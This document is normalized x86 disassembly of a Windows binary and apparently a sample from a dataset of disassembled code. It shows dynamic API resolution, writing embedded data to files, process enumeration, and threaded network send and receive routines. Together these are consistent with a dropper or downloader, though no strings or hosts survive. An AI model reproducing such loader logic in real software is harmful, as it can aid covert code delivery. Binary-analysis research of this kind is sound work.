push esi
lea eax [ ebp - 0x117 ]
push ebx
push eax
mov [ ebp - 0x118 ] bl
call sub_2013580
lea eax [ ebp - 0x220 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x118 ]
push r--data
push eax
call sub_200101f
mov esi [ GetModuleHandleA@IAT ]
add esp 0x34
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x118 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call esi
push eax
call edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x118 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call esi
push eax
call edi
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] ebx
je r-xdata
xor eax eax
cmp [ ebp - 0xc ] ebx
je r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x118 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call esi
push eax
call edi
mov edi eax
cmp edi ebx
je r-xdata
push [ ebp + 0x8 ]
push 0x81
push ebx
call [ ebp - 0x4 ]
mov esi eax
cmp esi ebx
je r-xdata
push esi
push ebx
call edi
mov edi eax
cmp edi ebx
je r-xdata
push esi
push ebx
call [ ebp - 0xc ]
mov esi eax
push edi
mov [ ebp - 0xc ] esi
call [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push esi
call sub_2009eef
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
imul esi esi 0x6
push esi
call sub_2009eef
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_200109f
push esi
push ebx
push edi
call sub_2013580
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] esi
push [ ebp - 0x4 ]
lea esi [ ebp - 0x8 ]
push edi
call sub_2005af0
add esp 0x24
push [ ebp - 0x4 ]
test eax eax
jge r-xdata
push [ ebp - 0x4 ]
call sub_2009d98
pop ecx
push ebx
push ebx
push 0x2
push ebx
push ebx
push 0xc0000000
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
call sub_2009d98
push edi
call sub_2009d98
pop ecx
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push edi
push esi
call [ WriteFile@IAT ]
push edi
test eax eax
jne r-xdata
push edi
jmp r-xdata
pop ecx
call sub_2009d98
pop ecx
push esi
call [ CloseHandle@IAT ]
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x324 ]
sub eax esi
call sub_2009d98
pop ecx
push esi
call sub_2009d98
mov cl [ esi ]
mov [ eax + esi ] cl
inc esi
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x324 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
push ebx
push ebx
push 0x2
push ebx
push ebx
push 0xc0000000
lea eax [ ebp - 0x324 ]
mov esi r--data
push eax
movsw [ edi ] [ esi ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
push 0x670
push rw-data
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
jmp r-xdata
call [ CloseHandle@IAT ]
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_200465f
push ebp
mov ebp esp
sub esp 0x554
push ebx
push esi
push edi
mov esi 0x103
xor ebx ebx
push esi
lea eax [ ebp - 0x217 ]
push ebx
push eax
mov [ ebp - 0x218 ] bl
call sub_2013580
push esi
lea eax [ ebp - 0x54f ]
push ebx
push eax
mov [ ebp - 0x550 ] bl
call sub_2013580
add esp 0x18
inc esi
push esi
lea eax [ ebp - 0x218 ]
push eax
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x218 ]
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
je r-xdata
xor eax eax
lea eax [ ebp - 0x218 ]
push 0x5c
push eax
call sub_200a930
pop ecx
inc eax
lea edx [ ebp - 0x550 ]
pop ecx
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push esi
lea eax [ ebp - 0x31f ]
push ebx
push eax
mov [ ebp - 0x320 ] bl
call sub_2013580
push esi
lea eax [ ebp - 0x10f ]
push ebx
push eax
mov [ ebp - 0x110 ] bl
call sub_2013580
lea eax [ ebp - 0x320 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_200101f
mov esi [ GetModuleHandleA@IAT ]
add esp 0x28
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x320 ]
push eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x320 ]
push eax
call esi
push eax
call edi
mov edi eax
cmp edi ebx
je r-xdata
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov ax [ ebp - 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x448 ]
push eax
mov esi 0x128
push ebx
mov [ ebp - 0x448 ] esi
call [ ebp - 0x8 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax eax
jne r-xdata
lea eax [ ebp - 0x550 ]
push eax
lea eax [ ebp - 0x424 ]
push eax
call sub_2009b94
pop ecx
pop ecx
test eax eax
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x448 ]
push eax
push ebx
mov [ ebp - 0x448 ] esi
call edi
inc [ ebp - 0x4 ]
sub_20047f9
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi [ rw-data ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x104 ]
push eax
push esi
call [ GetProcAddress@IAT ]
jmp r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x104 ]
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ rw-data ] esi
test esi esi
je r-xdata
pop esi
leave
retn
xor eax eax
sub_200485f
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi [ rw-data ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x104 ]
push eax
push esi
call [ GetProcAddress@IAT ]
jmp r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x104 ]
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ rw-data ] esi
test esi esi
je r-xdata
pop esi
leave
retn
xor eax eax
sub_20048d1
cmp [ rw-data ] 0x1
push ebx
push ebp
mov ebp [ esp + 0xc ]
jne r-xdata
push esi
push edi
mov edi 0x404
push edi
call sub_2009eef
mov esi eax
xor ebx ebx
pop ecx
cmp esi ebx
je r-xdata
push r--data
call sub_20047f9
xor ebx ebx
pop ecx
cmp eax ebx
jne r-xdata
xor eax eax
cmp [ rw-data ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebp
call eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push r--data
call sub_200485f
pop ecx
mov [ rw-data ] eax
pop ebp
pop ebx
retn 0x4
cmp [ rw-data ] ebx
jne r-xdata
push r--data
call sub_200485f
pop ecx
mov [ rw-data ] eax
cmp [ rw-data ] ebx
jne r-xdata
push r--data
call sub_200485f
pop ecx
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
push r--data
call sub_200485f
pop ecx
mov [ rw-data ] eax
cmp [ rw-data ] ebx
je r-xdata
push r--data
call sub_200485f
pop ecx
mov [ rw-data ] eax
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp eax ebx
je r-xdata
push edi
push ebx
push esi
call sub_2013580
lea ecx [ esi + 0x4 ]
add esp 0xc
mov [ esi ] ebx
mov eax ebp
sub ecx ebp
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
cmp dl bl
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
sub_20049e6
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
push esi
push edi
jne r-xdata
mov edi 0x130
push edi
call sub_2009eef
mov esi eax
pop ecx
test esi esi
je r-xdata
push r--data
call sub_20047f9
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
xor eax eax
jmp r-xdata
push edi
push 0x0
push esi
call sub_2013580
movzx edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
add esp 0xc
push edi
push [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x110 ]
mov [ esi ] 0x1
call sub_2005969
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
push ecx
push ecx
push 0x3
push ecx
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0xc ]
lea edx [ esi + 0xc ]
sub edx eax
push esi
call sub_2009d98
pop ecx
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov [ esi + 0x10c ] edi
mov eax esi
sub_2004aa8
cmp [ rw-data ] 0x1
jne r-xdata
test esi esi
je r-xdata
push r--data
call sub_20047f9
pop ecx
test eax eax
jne r-xdata
xor eax eax
retn
mov eax [ esi ]
cmp eax 0x1
jne r-xdata
push esi
call eax
retn
cmp eax 0x2
jne r-xdata
push [ esi + 0x8 ]
call [ closesocket@IAT ]
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
call sub_2009d98
xor eax eax
pop ecx
inc eax
retn
cmp [ esi + 0x1434 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
push [ eax + 0x8 ]
call [ rw-data ]
mov eax [ esi + 0x4 ]
and [ eax + 0x8 ] 0x0
sub_2004b0d
cmp [ rw-data ] 0x1
push ebx
push esi
jne r-xdata
mov ebx 0x1438
push ebx
call sub_2009eef
mov esi eax
pop ecx
test esi esi
je r-xdata
push r--data
call sub_20047f9
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push 0x0
push esi
call sub_2013580
xor ebx ebx
add esp 0xc
mov [ esi ] 0x2
mov [ esi + 0x4 ] edi
cmp [ edi + 0x8 ] ebx
jne r-xdata
push ecx
push 0x4080000
push ecx
push ecx
push ecx
push [ esp + 0x20 ]
push r--data
push edi
call eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
mov eax r--data
lea edx [ esi + 0x8 ]
sub edx eax
push [ edi + 0x10c ]
lea ecx [ edi + 0xc ]
lea eax [ edi + 0x110 ]
push ecx
call sub_2005969
pop ecx
pop ecx
mov [ edi + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax [ esp + 0xc ]
lea edx [ esi + 0x28 ]
sub edx eax
push esi
call sub_2009d98
pop ecx
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
or [ esi + 0x42c ] 0xffffffff
mov [ esi + 0x1430 ] ebx
mov [ esi + 0x428 ] ebx
mov [ esi + 0x1434 ] ebx
mov eax esi
sub_2004be6
and [ rw-data ] 0x0
push r--data
call sub_20047f9
pop ecx
test eax eax
je r-xdata
retn 0x4
mov ecx [ esp + 0x4 ]
push [ ecx + 0x10 ]
push [ ecx + 0xc ]
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ecx ]
call eax
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
sub_2004c21
push ebp
lea ebp [ esp - 0x78 ]
mov eax 0x1558
call sub_2022d90
push esi
xor esi esi
inc esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push 0x13ff
xor edi edi
lea eax [ ebp - 0x14df ]
push edi
push eax
mov [ ebp - 0x14e0 ] 0x0
call sub_2013580
push 0x7f
lea eax [ ebp - 0x1f ]
push edi
push eax
mov [ ebp + 0x74 ] esi
mov [ ebp - 0x20 ] 0x0
call sub_2013580
push 0x3f
lea eax [ ebp - 0x9f ]
push edi
push eax
mov [ ebp - 0xa0 ] 0x0
call sub_2013580
push 0x3f
lea eax [ ebp - 0x5f ]
push edi
push eax
mov [ ebp - 0x60 ] 0x0
call sub_2013580
push 0x3f
lea eax [ ebp - 0xdf ]
push edi
push eax
mov [ ebp - 0xe0 ] 0x0
call sub_2013580
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_200101f
add esp 0x44
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebx + 0x28 ]
push eax
mov eax [ ebx + 0x4 ]
lea esi [ ebx + 0x8 ]
push esi
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_200101f
add esp 0x44
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_200101f
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
add ecx 0x4
push ecx
lea ecx [ ebp - 0x20 ]
push ecx
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_200101f
mov eax [ ebx + 0x4 ]
lea ecx [ eax + 0xc ]
push ecx
lea ecx [ ebp - 0x20 ]
push ecx
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_200101f
add esp 0x44
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
mov eax [ ebx + 0x1430 ]
add esp 0x14
cmp eax edi
jle r-xdata
or [ ebp + 0x68 ] 0xffffffff
xor esi esi
lea eax [ ebp + 0x74 ]
push eax
push esi
lea eax [ ebp + 0x60 ]
push eax
push sub_2004be6
push esi
push esi
mov [ ebp + 0x74 ] esi
mov [ ebp + 0x60 ] ebx
mov [ ebp + 0x64 ] esi
mov [ ebp + 0x6c ] esi
mov [ ebp + 0x70 ] esi
mov [ rw-data ] esi
call [ CreateThread@IAT ]
mov edi eax
push 0x493e0
push edi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_200101f
add esp 0x10
lea eax [ ebp - 0x20 ]
push edi
push eax
lea eax [ ebx + 0x430 ]
push eax
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
call [ rw-data ]
mov eax [ rw-data ]
jmp r-xdata
push esi
push edi
call [ TerminateThread@IAT ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
pop edi
pop esi
add ebp 0x78
leave
retn
mov eax [ ebp + 0x74 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x14e0 ]
push 0x400
call sub_20059ff
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp eax edi
je r-xdata
inc esi
inc esi
inc eax
inc eax
test cl cl
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x14e0 ]
pop ecx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ ebx + 0x1434 ] 0x1
jmp r-xdata
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ ebp - 0x14e0 ]
push r--data
push eax
call sub_200a1e4
push r--data
xor esi esi
push esi
call sub_200a1e4
add esp 0x10
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push eax
call sub_200a075
pop ecx
cmp eax 0xc8
je r-xdata
mov [ ebx + 0x1434 ] 0x1
jmp r-xdata
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0xe0 ]
push r--data
push eax
call sub_200101f
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x14e0 ]
push 0x400
call sub_20059ff
add esp 0x20
jmp r-xdata
mov [ ebp + 0x74 ] esi
test eax eax
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x14e0 ]
pop ecx
xor eax eax
[ esi ] [ edi ]
je r-xdata
push 0xe
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x14e0 ]
push eax
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
push 0x1a
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x14e0 ]
push eax
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x14d1 ]
push eax
call sub_200a046
pop ecx
mov [ ebx + 0x42c ] eax
jmp r-xdata
push 0x11
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x14e0 ]
push eax
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
mov [ ebx + 0x428 ] 0x1
jmp r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x14e0 ]
push 0x400
call sub_20059ff
pop ecx
pop ecx
mov [ ebx + 0x1434 ] 0x1
sub_2005020
and [ rw-data ] 0x0
push r--data
call sub_20047f9
pop ecx
test eax eax
je r-xdata
retn 0x4
mov ecx [ esp + 0x4 ]
push [ ecx + 0x10 ]
push [ ecx + 0xc ]
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ecx ]
call eax
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
sub_200505b
push ebp
lea ebp [ esp - 0x68 ]
mov eax 0x1554
call sub_2022d90
push esi
xor esi esi
inc esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push 0x13ff
xor edi edi
lea eax [ ebp - 0x14eb ]
push edi
push eax
mov [ ebp - 0x14ec ] 0x0
call sub_2013580
push 0x7f
lea eax [ ebp - 0x2b ]
push edi
push eax
mov [ ebp + 0x74 ] esi
mov [ ebp - 0x2c ] 0x0
call sub_2013580
push 0x3f
lea eax [ ebp - 0xab ]
push edi
push eax
mov [ ebp - 0xac ] 0x0
call sub_2013580
push 0x3f
lea eax [ ebp - 0x6b ]
push edi
push eax
mov [ ebp - 0x6c ] 0x0
call sub_2013580
push 0x3f
lea eax [ ebp - 0xeb ]
push edi
push eax
mov [ ebp - 0xec ] 0x0
call sub_2013580
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_200101f
add esp 0x44
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebx + 0x28 ]
push eax
mov eax [ ebx + 0x4 ]
lea esi [ ebx + 0x8 ]
push esi
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_200101f
add esp 0x44
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_200101f
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
add ecx 0x4
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_200101f
mov eax [ ebx + 0x4 ]
lea ecx [ eax + 0xc ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_200101f
add esp 0x44
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
mov eax [ ebx + 0x1430 ]
add esp 0x14
cmp eax edi
jle r-xdata
mov eax [ ebp + 0x70 ]
mov [ ebp + 0x58 ] eax
mov eax [ ebp + 0x74 ]
mov [ ebp + 0x5c ] eax
mov eax [ ebp + 0x78 ]
mov [ ebp + 0x60 ] eax
mov eax [ ebp + 0x7c ]
mov [ ebp + 0x64 ] eax
xor esi esi
lea eax [ ebp + 0x70 ]
push eax
push esi
lea eax [ ebp + 0x54 ]
push eax
push sub_2005020
push esi
push esi
mov [ ebp + 0x54 ] ebx
mov [ rw-data ] esi
call [ CreateThread@IAT ]
mov edi eax
push 0x493e0
push edi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov eax [ ebp + 0x70 ]
cmp eax edi
je r-xdata
push edi
push eax
lea eax [ ebx + 0x430 ]
push eax
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
call [ rw-data ]
mov eax [ rw-data ]
jmp r-xdata
push esi
push edi
call [ TerminateThread@IAT ]
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_200101f
add esp 0x10
lea eax [ ebp - 0x2c ]
push [ eax + 0x1c ]
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_2005a43
add esp 0xc
pop edi
pop esi
add ebp 0x68
leave
retn 0x10
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ ebp + 0x74 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x14ec ]
push 0x400
call sub_20059ff
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp eax edi
je r-xdata
inc esi
inc esi
inc eax
inc eax
test cl cl
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x14ec ]
pop ecx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ ebx + 0x1434 ] 0x1
jmp r-xdata
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ ebp - 0x14ec ]
push r--data
push eax
call sub_200a1e4
push r--data
xor esi esi
push esi
call sub_200a1e4
add esp 0x10
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push eax
call sub_200a075
pop ecx
cmp eax 0xc8
je r-xdata
mov [ ebx + 0x1434 ] 0x1
jmp r-xdata
lea eax [ ebp - 0xac ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x6c ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0xec ]
push r--data
push eax
call sub_200101f
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x14ec ]
push 0x400
call sub_20059ff
add esp 0x20
jmp r-xdata
mov [ ebp + 0x74 ] esi
test eax eax
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x14ec ]
pop ecx
xor eax eax
[ esi ] [ edi ]
je r-xdata
push 0xe
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0x14ec ]
push eax
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
push 0x1a
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x14ec ]
push eax
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x14dd ]
push eax
call sub_200a046
pop ecx
mov [ ebx + 0x42c ] eax
jmp r-xdata
push 0x11
lea eax [ ebp - 0xec ]
push eax
lea eax [ ebp - 0x14ec ]
push eax
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
mov [ ebx + 0x428 ] 0x1
jmp r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x14ec ]
push 0x400
call sub_20059ff
pop ecx
pop ecx
mov [ ebx + 0x1434 ] 0x1
sub_2005481
and [ rw-data ] 0x0
push r--data
call sub_20047f9
pop ecx
test eax eax
je r-xdata
retn 0x4
mov ecx [ esp + 0x4 ]
push [ ecx + 0xc ]
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ecx ]
call eax
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
sub_20054b9
push ebp
mov ebp esp
sub esp 0x110
cmp [ rw-data ] 0x1
push ebx
push esi
push edi
mov edi eax
jne r-xdata
cmp [ edi + 0x428 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp + 0xc ]
push eax
mov [ ebp - 0x10 ] edi
xor edi edi
push edi
lea eax [ ebp - 0x10 ]
push eax
push sub_2005481
push edi
push edi
mov [ rw-data ] edi
call [ CreateThread@IAT ]
mov esi eax
push 0x493e0
push esi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov eax [ edi + 0x42c ]
xor esi esi
cmp eax esi
jle r-xdata
lea ebx [ edi + 0x42c ]
mov eax [ ebx ]
test eax eax
jge r-xdata
mov eax [ rw-data ]
jmp r-xdata
push edi
push esi
call [ TerminateThread@IAT ]
jge r-xdata
cmp eax [ ebp + 0xc ]
push esi
jle r-xdata
jle r-xdata
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x110 ]
push 0x100
call sub_20059ff
push ebx
mov eax esi
push r--data
push eax
call sub_200b4b4
mov eax [ ebx ]
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ edi + 0x4 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x8 ]
call [ recv@IAT ]
cmp eax esi
jle r-xdata
push eax
push [ ebp + 0xc ]
jmp r-xdata
xor eax eax
jmp r-xdata
cmp eax [ ebp + 0xc ]
push 0x0
jle r-xdata
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
push 0x100
call sub_20059ff
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub [ edi + 0x42c ] eax
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
call [ recv@IAT ]
cmp eax esi
jl r-xdata
push eax
push [ ebp + 0xc ]
jmp r-xdata
xor eax eax
inc eax
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub [ ebx ] eax
jne r-xdata
push [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
call [ recv@IAT ]
test eax eax
jl r-xdata
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x110 ]
push 0x100
call sub_20059ff
or [ ebx ] 0xffffffff
pop ecx
pop ecx
jmp r-xdata
sub_200564a
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ eax + 0x8 ]
call [ rw-data ]
test eax eax
jge r-xdata
push esi
push [ esp + 0xc ]
push [ esp + 0xc ]
push eax
call [ InternetWriteFile@IAT ]
jmp r-xdata
mov [ esi ] eax
xor eax eax
inc eax
xor eax eax
jmp r-xdata
retn 0x8
sub_200568b
cmp [ rw-data ] 0x1
push edi
